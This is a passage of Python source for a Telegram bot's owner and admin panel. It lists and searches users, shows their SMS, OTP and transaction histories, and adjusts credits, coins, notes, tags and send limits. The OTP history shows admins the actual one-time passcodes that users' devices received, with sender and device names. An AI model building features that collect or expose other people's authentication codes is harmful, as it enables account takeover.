    rows.append([btn("back", f"{prefix}:home", EMOJI_GEAR, "🔙")])
    return "\n".join(lines), InlineKeyboardMarkup(inline_keyboard=rows)

@R.callback_query(F.data.in_({"owner:users:list", "admin:users:list"}))
async def users_list(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    prefix = "owner" if is_owner(uid, d) else "admin"
    if not is_admin(uid, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    txt, mk = _users_list(d, prefix, 0)
    await safe_edit(cq, txt, mk)

@R.callback_query(F.data.regexp(r"^(owner|admin):users:pg:(\d+)$"))
async def users_page(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_admin(uid, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    parts = cq.data.split(":")
    txt, mk = _users_list(d, parts[0], int(parts[3]))
    await safe_edit(cq, txt, mk)

# ============================================================
#  USER DETAIL
# ============================================================
def _user_detail(d, uid):
    k = str(uid)
    ud = d.get("users", {}).get(k, {})
    nm = esc(str(ud.get("name", "?"))[:40])
    role = role_tag(uid, d)
    credits = ud.get("credits", 0)
    coins = ud.get("coins", 0)
    uses = ud.get("uses", 0)
    otp_uses = ud.get("otp_uses", 0)
    joined = fmt_time(ud.get("joined_at", 0))
    last_active = fmt_age(ud.get("last_active", 0))
    lim = get_user_send_limit(uid, d)
    olim = get_user_otp_limit(uid, d)
    lim_s = "unlimited" if lim is None else ("BLOCKED" if lim <= 0 else str(lim))
    olim_s = "unlimited" if olim is None else ("BLOCKED" if olim <= 0 else str(olim))
    note = esc(str(d.get("user_notes", {}).get(k, ""))[:100])
    ban_r = esc(str(d.get("ban_reasons", {}).get(k, ""))[:100])
    tags = d.get("user_tags", {}).get(k, [])
    tags_s = " ".join(f"#{esc(t)}" for t in tags[:5]) if tags else ""
    referred = len(d.get("referral_tree", {}).get(k, []))
    terms_ok = "✅" if ud.get("terms_accepted", False) else "❌"
    txt = (
        f"{em(EMOJI_USER, '👤')} <b>User Details</b>\n\n"
        f"🆔 <code>{uid}</code>\n"
        f"👤 <b>{nm}</b>\n"
        f"{role}\n"
        f"📜 terms: {terms_ok}\n"
    )
    if tags_s:
        txt += f"{em(EMOJI_TAG, '🏷')} {tags_s}\n"
    txt += (
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"{em(EMOJI_MONEY, '💰')} ᴄʀᴇᴅɪᴛs : <b>{credits}</b>\n"
        f"{em(EMOJI_COIN, '🪙')} ᴄᴏɪɴs   : <b>{coins}</b>\n"
        f"{em(EMOJI_STAR, '📤')} sᴍs ᴜsᴇs: <b>{uses}</b>\n"
        f"{em(EMOJI_OTP, '🔐')} ᴏᴛᴘ ᴜsᴇs: <b>{otp_uses}</b>\n"
        f"{em(EMOJI_LOCK, '🔒')} sᴍs ʟɪᴍ: <b>{lim_s}</b>\n"
        f"{em(EMOJI_LOCK, '🔐')} ᴏᴛᴘ ʟɪᴍ: <b>{olim_s}</b>\n"
        f"{em(EMOJI_CLOCK, '📅')} ᴊᴏɪɴᴇᴅ  : <b>{joined}</b>\n"
        f"{em(EMOJI_CLOCK, '🕐')} ʟᴀsᴛ   : <b>{last_active}</b>\n"
        f"{em(EMOJI_USER, '👥')} ʀᴇғᴇʀs  : <b>{referred}</b>\n"
    )
    if note:
        txt += f"\n📝 <b>Note:</b> {note}"
    if ban_r:
        txt += f"\n🚫 <b>Ban:</b> {ban_r}"
    return txt

def _user_detail_kb(uid, d, prefix):
    rows = [
        [
            btn("add credits", f"{prefix}:u:addcr:{uid}", EMOJI_PLUS, "💰", style="success"),
            btn("add coins", f"{prefix}:u:addcoin:{uid}", EMOJI_PLUS, "🪙", style="success"),
        ],
        [
            btn("deduct credits", f"{prefix}:u:dedcr:{uid}", EMOJI_MINUS, "💰", style="danger"),
            btn("deduct coins", f"{prefix}:u:dedcoin:{uid}", EMOJI_MINUS, "🪙", style="danger"),
        ],
        [btn("send message", f"{prefix}:u:msg:{uid}", EMOJI_BELL, "📩", style="primary")],
        [
            btn("sms history", f"{prefix}:u:smshist:{uid}", EMOJI_CLOCK, "📜", style="primary"),
            btn("otp history", f"{prefix}:u:otphist:{uid}", EMOJI_OTP, "🔐", style="primary"),
        ],
        [
            btn("edit note", f"{prefix}:u:note:{uid}", EMOJI_GEAR, "📝", style="primary"),
            btn("edit tags", f"{prefix}:u:tags:{uid}", EMOJI_TAG, "🏷", style="primary"),
        ],
        [
            btn("sms limit", f"{prefix}:u:lim:{uid}", EMOJI_LOCK, "🔒", style="primary"),
            btn("otp limit", f"{prefix}:u:otplim:{uid}", EMOJI_LOCK, "🔐", style="primary"),
        ],
        [
            btn("toggle premium", f"{prefix}:u:premium:{uid}", EMOJI_STAR, "💎", style="primary"),
        ],
        [
            btn("tx history", f"{prefix}:u:txhist:{uid}", EMOJI_CHART, "📊", style="primary"),
            btn("referral tree", f"{prefix}:u:tree:{uid}", EMOJI_USER, "🌳", style="primary"),
        ],
    ]
    if uid in d.get("banned", []):
        rows.append([btn("unban user", f"{prefix}:u:unban:{uid}", EMOJI_CHECK, "✅", style="success")])
    else:
        rows.append([btn("ban user", f"{prefix}:u:ban:{uid}", EMOJI_CROSS, "🚫", style="danger")])
    rows.append([btn("back", f"{prefix}:users:list", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

@R.callback_query(F.data.regexp(r"^(owner|admin):user:view:(\d+)$"))
async def user_detail_view(cq: CallbackQuery, state: FSMContext):
    d = load()
    viewer = cq.from_user.id
    if not is_admin(viewer, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    parts = cq.data.split(":")
    prefix = parts[0]
    target = int(parts[3])
    if str(target) not in d.get("users", {}):
        try:
            await cq.answer("❌ User not found!", show_alert=True)
        except Exception:
            pass
        return
    await safe_edit(cq, _user_detail(d, target), _user_detail_kb(target, d, prefix))

# ============================================================
#  USER HISTORY (admin view)
# ============================================================
@R.callback_query(F.data.regexp(r"^(owner|admin):u:smshist:(\d+)$"))
async def user_sms_hist(cq: CallbackQuery, state: FSMContext):
    d = load()
    viewer = cq.from_user.id
    if not is_admin(viewer, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    parts = cq.data.split(":")
    prefix = parts[0]
    target = int(parts[3])
    hist = d.get("sms_history", {}).get(str(target), [])
    if not hist:
        txt = f"{em(EMOJI_CLOCK, '📜')} <b>SMS History</b>\n\nNo records."
    else:
        lines = [f"{em(EMOJI_CLOCK, '📜')} <b>SMS History</b> — <code>{target}</code>\n"]
        for i, e in enumerate(reversed(hist[-50:]), 1):
            ts = fmt_time(e.get("timestamp", 0))
            num = e.get("number", "?")
            msg = esc(str(e.get("message", ""))[:60])
            st = e.get("status", "?")
            ic = "✅" if st == "sent" else "🛑" if st == "stopped" else "⏳"
            lines.append(f"{i}. {ic} <code>{esc(num)}</code> [{ts}]\n   <i>{msg}</i>")
        txt = "\n".join(lines)
    if len(txt) > 4000:
        txt = txt[:3990] + "\n<i>...</i>"
    await safe_edit(cq, txt, kb([(sc("back"), f"{prefix}:user:view:{target}")]))

@R.callback_query(F.data.regexp(r"^(owner|admin):u:otphist:(\d+)$"))
async def user_otp_hist(cq: CallbackQuery, state: FSMContext):
    d = load()
    viewer = cq.from_user.id
    if not is_admin(viewer, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    parts = cq.data.split(":")
    prefix = parts[0]
    target = int(parts[3])
    hist = d.get("otp_history", {}).get(str(target), [])
    if not hist:
        txt = f"{em(EMOJI_OTP, '🔐')} <b>OTP History</b>\n\nNo records."
    else:
        lines = [f"{em(EMOJI_OTP, '🔐')} <b>OTP History</b> — <code>{target}</code>\n"]
        for i, e in enumerate(reversed(hist[-30:]), 1):
            ts = fmt_time(e.get("timestamp", 0))
            dev = esc(str(e.get("device_name", "?"))[:20])
            otp = e.get("otp", "?")
            sender = esc(str(e.get("sender", "?"))[:20])
            lines.append(f"{i}. 🔐 <b>{otp}</b> — {sender}\n   📱 {dev} [{ts}]")
        txt = "\n".join(lines)
    if len(txt) > 4000:
        txt = txt[:3990] + "\n<i>...</i>"
    await safe_edit(cq, txt, kb([(sc("back"), f"{prefix}:user:view:{target}")]))

@R.callback_query(F.data.regexp(r"^(owner|admin):u:txhist:(\d+)$"))
async def user_tx_hist(cq: CallbackQuery, state: FSMContext):
    d = load()
    viewer = cq.from_user.id
    if not is_admin(viewer, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    parts = cq.data.split(":")
    prefix = parts[0]
    target = int(parts[3])
    hist = d.get("transactions", {}).get(str(target), [])
    if not hist:
        txt = f"{em(EMOJI_CHART, '📊')} <b>Transactions</b>\n\nNo records."
    else:
        lines = [f"{em(EMOJI_CHART, '📊')} <b>Transactions</b> — <code>{target}</code>\n"]
        for i, e in enumerate(reversed(hist[-30:]), 1):
            ts = fmt_time(e.get("ts", 0))
            cur = e.get("currency", "?")
            delta = e.get("delta", 0)
            reason = e.get("reason", "")
            sign = "+" if delta > 0 else ""
            ic = "💰" if cur == "credits" else "🪙"
            lines.append(f"{i}. {ic} {sign}{delta} {cur} [{ts}]\n   <i>{esc(reason)[:40]}</i>")
        txt = "\n".join(lines)
    if len(txt) > 4000:
        txt = txt[:3990] + "\n<i>...</i>"
    await safe_edit(cq, txt, kb([(sc("back"), f"{prefix}:user:view:{target}")]))

@R.callback_query(F.data.regexp(r"^(owner|admin):u:tree:(\d+)$"))
async def user_tree(cq: CallbackQuery, state: FSMContext):
    d = load()
    viewer = cq.from_user.id
    if not is_admin(viewer, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    parts = cq.data.split(":")
    prefix = parts[0]
    target = int(parts[3])
    tree = d.get("referral_tree", {}).get(str(target), [])
    ud = d.get("users", {}).get(str(target), {})
    referrer = ud.get("referred_by")
    lines = [f"{em(EMOJI_USER, '🌳')} <b>Referral Tree</b> — <code>{target}</code>\n"]
    if referrer:
        rd = d.get("users", {}).get(str(referrer), {})
        lines.append(f"⬆️ Referred by: <code>{referrer}</code> ({esc(str(rd.get('name', '?'))[:20])})")
    if tree:
        lines.append(f"\n⬇️ Referred ({len(tree)}):")
        for u in tree[:30]:
            ru = d.get("users", {}).get(str(u), {})
            lines.append(f"  • <code>{u}</code> — {esc(str(ru.get('name', '?'))[:20])}")
        if len(tree) > 30:
            lines.append(f"  ...+{len(tree) - 30}")
    else:
        lines.append("\n<i>No referrals.</i>")
    txt = "\n".join(lines)
    if len(txt) > 4000:
        txt = txt[:3990] + "\n<i>...</i>"
    await safe_edit(cq, txt, kb([(sc("back"), f"{prefix}:user:view:{target}")]))

# ============================================================
#  USER SEARCH (owner)
# ============================================================
@R.callback_query(F.data == "owner:users:search")
async def user_search_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    await state.set_state(S.user_search)
    await safe_edit(
        cq,
        f"{em(EMOJI_SEARCH, '🔎')} <b>Search User</b>\n\n"
        f"Send user ID or part of name:",
        kb([(sc("cancel"), "owner:home")]),
    )

@R.message(S.user_search)
async def user_search_do(m: Message, state: FSMContext):
    d = load()
    if not is_owner(m.from_user.id, d):
        await state.clear()
        return
    q = (m.text or "").strip().lower()
    await state.clear()
    if not q:
        await m.answer(f"{em(EMOJI_CROSS, '❌')} Empty.", parse_mode="HTML")
        return
    matches = [
        (int(us), ud)
        for us, ud in d.get("users", {}).items()
        if q in us or q in str(ud.get("name", "")).lower()
    ]
    if not matches:
        await m.answer(
            f"{em(EMOJI_CROSS, '❌')} No match.",
            reply_markup=kb([(sc("back"), "owner:home")]),
            parse_mode="HTML",
        )
        return
    lines = [f"{em(EMOJI_SEARCH, '🔎')} <b>Found {len(matches)}</b>\n"]
    rows = []
    for uid, ud in matches[:15]:
        nm = esc(str(ud.get("name", "?"))[:22])
        lines.append(f"👤 {nm} — <code>{uid}</code>")
        rows.append([btn(f"{nm} • {uid}", f"owner:user:view:{uid}", EMOJI_USER, "👤")])
    rows.append([btn("back", "owner:home", EMOJI_GEAR, "🔙")])
    await m.answer("\n".join(lines), reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

# ============================================================
#  OWNER PANEL QUICK ADJUSTMENT — add/deduct by user ID
# ============================================================
@R.callback_query(F.data.in_({
    "owner:credits:add_pick", "owner:coins:add_pick",
    "owner:credits:deduct_pick", "owner:coins:deduct_pick",
}))
async def quick_adjust_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        try:
            await cq.answer("🚫 Not authorized", show_alert=True)
        except Exception:
            pass
        return
    action = {
        "owner:credits:add_pick": "addcr",
        "owner:coins:add_pick": "addcoin",
        "owner:credits:deduct_pick": "dedcr",
        "owner:coins:deduct_pick": "dedcoin",
    }.get(cq.data)
    if not action:
        await cq.answer("Unknown action", show_alert=True)
        return
    await state.update_data(quick_adjust_action=action)
    await state.set_state(S.quick_adjust_uid)
    try:
        await cq.answer()
    except Exception:
        pass
    await safe_edit(
        cq,
        f"{em(EMOJI_USER, '👤')} <b>Select user</b>\n\nSend the numeric Telegram user ID:",
        kb([(sc("cancel"), "owner:home")]),
    )

@R.message(S.quick_adjust_uid)
async def quick_adjust_uid_done(m: Message, state: FSMContext):
    d = load()
    if not is_admin(m.from_user.id, d):
        await state.clear()
        return
    raw = (m.text or "").strip()
    try:
        uid = int(raw)
        if uid <= 0:
            raise ValueError
    except (TypeError, ValueError):
        await m.answer("❌ Send a valid positive numeric user ID.")
        return
    if str(uid) not in d.get("users", {}):
        await m.answer("❌ User ID not found. Send an existing user ID or /cancel.")
        return
    data = await state.get_data()
    action = data.get("quick_adjust_action")
    mapping = {
        "addcr": ("addcr_uid", S.add_credits_amount, "credits"),
        "addcoin": ("addcoin_uid", S.add_coins_amount, "coins"),
        "dedcr": ("dedcr_uid", S.deduct_credits_amount, "credits"),
        "dedcoin": ("dedcoin_uid", S.deduct_coins_amount, "coins"),
    }
    selected = mapping.get(action)
    if not selected:
        await state.clear()
        await m.answer("❌ This action expired. Open the panel and try again.")
        return
    key, next_state, label = selected
    await state.update_data(**{key: uid})
    await state.set_state(next_state)
    verb = "Add" if action in ("addcr", "addcoin") else "Deduct"
    await m.answer(f"{verb} {label} for user {uid}. Send a positive amount:")

# ============================================================
#  USER DETAIL ACTIONS — add/deduct
# ============================================================
@R.callback_query(F.data.regexp(r"^(owner|admin):u:addcr:(\d+)$"))
async def u_addcr(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    uid = int(cq.data.split(":")[-1])
    await state.update_data(addcr_uid=uid)
    await state.set_state(S.add_credits_amount)
    back = "owner:home" if is_owner(cq.from_user.id, d) else "admin:home"
    await safe_edit(
        cq,
        f"{em(EMOJI_MONEY, '💰')} <b>Add Credits</b> to <code>{uid}</code>\n\n"
        f"Amount:",
        kb([(sc("cancel"), back)]),
    )

@R.callback_query(F.data.regexp(r"^(owner|admin):u:addcoin:(\d+)$"))
async def u_addcoin(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    uid = int(cq.data.split(":")[-1])
    await state.update_data(addcoin_uid=uid)
    await state.set_state(S.add_coins_amount)
    back = "owner:home" if is_owner(cq.from_user.id, d) else "admin:home"
    await safe_edit(
        cq,
        f"{em(EMOJI_COIN, '🪙')} <b>Add Coins</b> to <code>{uid}</code>\n\n"
        f"Amount:",
        kb([(sc("cancel"), back)]),
    )

@R.callback_query(F.data.regexp(r"^(owner|admin):u:dedcr:(\d+)$"))
async def u_dedcr(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    uid = int(cq.data.split(":")[-1])
    await state.update_data(dedcr_uid=uid)
    await state.set_state(S.deduct_credits_amount)
    back = "owner:home" if is_owner(cq.from_user.id, d) else "admin:home"
    await safe_edit(
        cq,
        f"{em(EMOJI_MONEY, '💰')} <b>Deduct Credits</b> from <code>{uid}</code>\n\n"
        f"Amount:",
        kb([(sc("cancel"), back)]),
    )

@R.callback_query(F.data.regexp(r"^(owner|admin):u:dedcoin:(\d+)$"))
async def u_dedcoin(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    uid = int(cq.data.split(":")[-1])
    await state.update_data(dedcoin_uid=uid)
    await state.set_state(S.deduct_coins_amount)
    back = "owner:home" if is_owner(cq.from_user.id, d) else "admin:home"
    await safe_edit(
        cq,
        f"{em(EMOJI_COIN, '🪙')} <b>Deduct Coins</b> from <code>{uid}</code>\n\n"
        f"Amount:",
        kb([(sc("cancel"), back)]),
    )

@R.message(S.add_credits_amount)
async def addcr_amt(m: Message, state: FSMContext):
    d = load()
    if not is_owner(m.from_user.id, d) and not is_admin(m.from_user.id, d):
        await state.clear()
        return
    try:
        amt = int((m.text or "").strip())
        if amt <= 0:
            raise ValueError
    except Exception:
        await m.answer(f"{em(EMOJI_CROSS, '❌')} Send positive number.", parse_mode="HTML")
        return
    fsmd = await state.get_data()
    uid = fsmd.get("addcr_uid")
    if uid is None:
        await state.clear()
        await m.answer(f"❌ Expired.", reply_markup=owner_kb(d), parse_mode="HTML")
        return
    add_credits(uid, amt, d, True, f"admin-add-{m.from_user.id}")
    log_audit(d, "add_credits", m.from_user.id, f"uid={uid} amt={amt}")
    save()
    await state.clear()
    try:
        await m.bot.send_message(
            uid,
            f"💰 <b>+{amt} credits!</b>\nBalance: {get_user_credits(uid, d)}",
            parse_mode="HTML",
        )
    except Exception:
        pass
    await m.answer(
        f"{em(EMOJI_CHECK, '✅')} +{amt} credits → <code>{uid}</code>\n"
        f"New: <b>{get_user_credits(uid, d)}</b>",
        reply_markup=owner_kb(d),
        parse_mode="HTML",
    )

@R.message(S.add_coins_amount)
async def addcoin_amt(m: Message, state: FSMContext):
    d = load()
    if not is_owner(m.from_user.id, d) and not is_admin(m.from_user.id, d):
        await state.clear()
        return
    try:
        amt = int((m.text or "").strip())
        if amt <= 0:
            raise ValueError
    except Exception:
        await m.answer(f"{em(EMOJI_CROSS, '❌')} Send positive number.", parse_mode="HTML")
        return
    fsmd = await state.get_data()
    uid = fsmd.get("addcoin_uid")
    if uid is None:
        await state.clear()
        await m.answer(f"❌ Expired.", reply_markup=owner_kb(d), parse_mode="HTML")
        return
    add_coins(uid, amt, d, True, f"admin-add-{m.from_user.id}")
    log_audit(d, "add_coins", m.from_user.id, f"uid={uid} amt={amt}")
    save()
    await state.clear()
    try:
        await m.bot.send_message(
            uid,
            f"🪙 <b>+{amt} coins!</b>\nBalance: {get_user_coins(uid, d)}",
            parse_mode="HTML",
        )
    except Exception:
        pass
    await m.answer(
        f"{em(EMOJI_CHECK, '✅')} +{amt} coins → <code>{uid}</code>\n"
        f"New: <b>{get_user_coins(uid, d)}</b>",
        reply_markup=owner_kb(d),
        parse_mode="HTML",
    )

@R.message(S.deduct_credits_amount)
async def dedcr_amt(m: Message, state: FSMContext):
    d = load()
    if not is_owner(m.from_user.id, d) and not is_admin(m.from_user.id, d):
        await state.clear()
        return
    try:
        amt = int((m.text or "").strip())
        if amt <= 0:
            raise ValueError
    except Exception:
        await m.answer(f"{em(EMOJI_CROSS, '❌')} Send positive number.", parse_mode="HTML")
        return
    fsmd = await state.get_data()
    uid = fsmd.get("dedcr_uid")
    if uid is None:
        await state.clear()
        await m.answer(f"❌ Expired.", reply_markup=owner_kb(d), parse_mode="HTML")
        return
    ok = deduct_credits(uid, amt, d, f"admin-ded-{m.from_user.id}")
    log_audit(d, "deduct_credits", m.from_user.id, f"uid={uid} amt={amt} ok={ok}")
    save()
    await state.clear()
    if ok:
        try:
            await m.bot.send_message(
                uid,
                f"⚠️ -{amt} credits. Balance: {get_user_credits(uid, d)}",
                parse_mode="HTML",
            )
        except Exception:
            pass
        await m.answer(
            f"{em(EMOJI_CHECK, '✅')} -{amt} → <code>{uid}</code>\nNew: <b>{get_user_credits(uid, d)}</b>",
            reply_markup=owner_kb(d),
            parse_mode="HTML",
        )
    else:
        await m.answer(
            f"{em(EMOJI_CROSS, '❌')} Insufficient. Left: {get_user_credits(uid, d)}",
            reply_markup=owner_kb(d),
            parse_mode="HTML",
        )

@R.message(S.deduct_coins_amount)
async def dedcoin_amt(m: Message, state: FSMContext):
    d = load()
    if not is_owner(m.from_user.id, d) and not is_admin(m.from_user.id, d):
        await state.clear()
        return
    try:
        amt = int((m.text or "").strip())
        if amt <= 0:
            raise ValueError
    except Exception:
        await m.answer(f"{em(EMOJI_CROSS, '❌')} Send positive number.", parse_mode="HTML")
        return
    fsmd = await state.get_data()
    uid = fsmd.get("dedcoin_uid")
    if uid is None:
        await state.clear()
        await m.answer(f"❌ Expired.", reply_markup=owner_kb(d), parse_mode="HTML")
        return
    ok = deduct_coins(uid, amt, d, f"admin-ded-{m.from_user.id}")
    log_audit(d, "deduct_coins", m.from_user.id, f"uid={uid} amt={amt} ok={ok}")
    save()
    await state.clear()
    if ok:
        try:
            await m.bot.send_message(
                uid,
                f"⚠️ -{amt} coins. Balance: {get_user_coins(uid, d)}",
                parse_mode="HTML",
            )
        except Exception:
            pass
        await m.answer(
            f"{em(EMOJI_CHECK, '✅')} -{amt} coins → <code>{uid}</code>\nNew: <b>{get_user_coins(uid, d)}</b>",
            reply_markup=owner_kb(d),
            parse_mode="HTML",
        )
    else:
        await m.answer(
            f"{em(EMOJI_CROSS, '❌')} Insufficient. Left: {get_user_coins(uid, d)}",
            reply_markup=owner_kb(d),
            parse_mode="HTML",
        )

# ============================================================
#  USER DETAIL — message / note / tags / limit / premium
# ============================================================
@R.callback_query(F.data.regexp(r"^(owner|admin):u:msg:(\d+)$"))
async def u_msg(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    uid = int(cq.data.split(":")[-1])
    await state.update_data(direct_msg_uid=uid)
    await state.set_state(S.direct_msg_text)
    back = "owner:home" if is_owner(cq.from_user.id, d) else "admin:home"
    await safe_edit(
        cq,
        f"{em(EMOJI_BELL, '📩')} <b>Send Message</b> to <code>{uid}</code>\n\n"
        f"Type the message:",
        kb([(sc("cancel"), back)]),
    )

@R.callback_query(F.data.regexp(r"^(owner|admin):u:note:(\d+)$"))
async def u_note(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    uid = int(cq.data.split(":")[-1])
    await state.update_data(user_note_uid=uid)
    await state.set_state(S.user_note_text)
    back = "owner:home" if is_owner(cq.from_user.id, d) else "admin:home"
    cur = esc(str(d.get("user_notes", {}).get(str(uid), ""))[:100]) or "<i>(empty)</i>"
    await safe_edit(
        cq,
        f"{em(EMOJI_GEAR, '📝')} <b>Note</b> for <code>{uid}</code>\n\n"
        f"Current: {cur}\n\n"
        f"New note (or <code>clear</code>):",
        kb([(sc("cancel"), back)]),
    )

@R.message(S.user_note_text)
async def u_note_save(m: Message, state: FSMContext):
    d = load()
    uid = m.from_user.id
    if not is_admin(uid, d):
        await state.clear()
        return
    fsmd = await state.get_data()
    target = fsmd.get("user_note_uid")
    if target is None:
        await state.clear()
        await m.answer(f"❌ Expired.", parse_mode="HTML")
        return
    txt = (m.text or "").strip()[:200]
    await state.clear()
    if txt.lower() in ("clear", "remove", "none", "-"):
        d.setdefault("user_notes", {}).pop(str(target), None)
        save()
        await m.answer(
            f"✅ Cleared.",
            reply_markup=owner_kb(d) if is_owner(uid, d) else admin_kb(d),
            parse_mode="HTML",
        )
        return
    d.setdefault("user_notes", {})[str(target)] = txt
    save()
    await m.answer(
        f"✅ Saved.",
        reply_markup=owner_kb(d) if is_owner(uid, d) else admin_kb(d),
        parse_mode="HTML",
    )

@R.callback_query(F.data.regexp(r"^(owner|admin):u:tags:(\d+)$"))
async def u_tags(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    uid = int(cq.data.split(":")[-1])
    await state.update_data(user_tag_uid=uid)
    await state.set_state(S.user_tag_text)
    back = "owner:home" if is_owner(cq.from_user.id, d) else "admin:home"
    cur = d.get("user_tags", {}).get(str(uid), [])
    cur_s = ", ".join(cur) if cur else "<i>(none)</i>"
    await safe_edit(
        cq,
        f"{em(EMOJI_TAG, '🏷')} <b>Tags</b> for <code>{uid}</code>\n\n"
        f"Current: {cur_s}\n\n"
        f"New tags (comma-separated, or <code>clear</code>):",
        kb([(sc("cancel"), back)]),
    )

@R.message(S.user_tag_text)
async def u_tags_save(m: Message, state: FSMContext):
    d = load()
    uid = m.from_user.id
    if not is_admin(uid, d):
        await state.clear()
        return
    fsmd = await state.get_data()
    target = fsmd.get("user_tag_uid")
    if target is None:
        await state.clear()
        await m.answer(f"❌ Expired.", parse_mode="HTML")
        return
    raw = (m.text or "").strip()
    await state.clear()
    if raw.lower() in ("clear", "remove", "none", "-"):
        d.setdefault("user_tags", {})[str(target)] = []
        save()
        await m.answer(
            f"✅ Tags cleared.",
            reply_markup=owner_kb(d) if is_owner(uid, d) else admin_kb(d),
            parse_mode="HTML",
        )
        return
    tags = [t.strip()[:20] for t in raw.split(",") if t.strip()]
    d.setdefault("user_tags", {})[str(target)] = tags[:10]
    save()
    await m.answer(
        f"✅ Saved {len(tags)} tag(s).",
        reply_markup=owner_kb(d) if is_owner(uid, d) else admin_kb(d),
        parse_mode="HTML",
    )

@R.callback_query(F.data.regexp(r"^(owner|admin):u:lim:(\d+)$"))
async def u_lim(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    uid = int(cq.data.split(":")[-1])
    await state.update_data(limit_target_uid=uid)
    await state.set_state(S.set_limit_value)
    back = "owner:home" if is_owner(cq.from_user.id, d) else "admin:home"
    cur = get_user_send_limit(uid, d)
    cs = "Unlimited" if cur is None else ("🚫 BLOCKED" if cur <= 0 else str(cur))
    await safe_edit(
        cq,
        f"{em(EMOJI_LOCK, '🔒')} <b>SMS Limit</b>\n\n"
        f"Current: <b>{cs}</b>\n\n"
        f"Send number, <code>0</code> to block, or <code>off</code> for unlimited:",
        kb([(sc("cancel"), back)]),
    )

@R.callback_query(F.data.regexp(r"^(owner|admin):u:otplim:(\d+)$"))
async def u_otplim(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    uid = int(cq.data.split(":")[-1])
    await state.update_data(otplimit_target_uid=uid)
    await state.set_state(S.set_otp_limit_value)
    back = "owner:home" if is_owner(cq.from_user.id, d) else "admin:home"
    cur = get_user_otp_limit(uid, d)
    cs = "Unlimited" if cur is None else ("🚫 BLOCKED" if cur <= 0 else str(cur))
    await safe_edit(
        cq,
        f"{em(EMOJI_OTP, '🔐')} <b>OTP Limit</b>\n\n"
        f"Current: <b>{cs}</b>\n\n"
        f"Send number, <code>0</code> to block, or <code>off</code> for unlimited:",
        kb([(sc("cancel"), back)]),
    )

@R.message(S.set_limit_value)
async def set_limit_val(m: Message, state: FSMContext):
    d = load()
    if not is_owner(m.from_user.id, d) and not is_admin(m.from_user.id, d):
        await state.clear()
        return
    txt = (m.text or "").strip().lower()
    fsmd = await state.get_data()
    target = fsmd.get("limit_target_uid")
    if target is None:
        await state.clear()
        await m.answer(f"❌ Expired.", reply_markup=owner_kb(d), parse_mode="HTML")
        return
    if txt in ("off", "unlimited", "remove", "none", "reset"):
        set_user_send_limit(target, None, d)
        save()
        await state.clear()
        await m.answer(f"✅ Unlimited", reply_markup=owner_kb(d), parse_mode="HTML")
        return
    try:
        lv = int(txt)
        if lv < 0:
            raise ValueError
    except Exception:
        await m.answer(f"❌ Invalid.", parse_mode="HTML")
        return
    set_user_send_limit(target, lv, d)
    log_audit(d, "set_sms_limit", m.from_user.id, f"uid={target} val={lv}")
    save()
    await state.clear()
    await m.answer(
        f"✅ <code>{target}</code> → {lv}",
        reply_markup=owner_kb(d),
        parse_mode="HTML",
    )

@R.message(S.set_otp_limit_value)
async def set_otplimit_val(m: Message, state: FSMContext):
    d = load()
    if not is_owner(m.from_user.id, d) and not is_admin(m.from_user.id, d):
        await state.clear()
        return
    txt = (m.text or "").strip().lower()
    fsmd = await state.get_data()
    target = fsmd.get("otplimit_target_uid")
    if target is None:
        await state.clear()
        await m.answer(f"❌ Expired.", reply_markup=owner_kb(d), parse_mode="HTML")
        return
    if txt in ("off", "unlimited", "remove", "none", "reset"):
